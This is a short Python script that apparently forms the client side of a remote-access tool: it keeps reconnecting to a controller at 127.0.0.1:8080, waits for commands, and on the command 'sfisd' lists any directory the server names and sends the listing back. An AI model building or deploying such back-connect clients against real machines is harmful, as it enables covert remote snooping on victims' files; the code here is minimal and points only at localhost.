import socket
import os
import ast

s = socket.socket()

ip = "127.0.0.1"
port = 8080

def reset():
    global s
    
    s = socket.socket()

while True:

    try:
        incoming_message = s.recv(1024)
        incoming_message = incoming_message.decode()
        incoming_message = ast.literal_eval(incoming_message)

        if(incoming_message[0] == "sfisd"):
            myDir = os.listdir(incoming_message[1])
            end = str(['sfisd', myDir])
            end = end.encode()
            s.send(end)
    except:
        try:
            s.connect((ip, port))
        except:
            reset()